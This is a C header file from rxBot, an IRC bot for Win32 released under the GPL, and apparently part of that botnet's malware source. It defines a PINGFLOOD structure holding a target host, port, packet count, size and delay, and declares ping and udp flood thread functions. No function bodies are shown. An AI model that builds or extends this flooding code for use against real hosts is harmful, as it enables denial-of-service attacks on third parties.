/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD 
{
	SOCKET sock;
	char host[MAXHOSTNAME];
	char chan[MAXCHANLEN];
	int num;
	int size;
	int delay;
	unsigned short port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

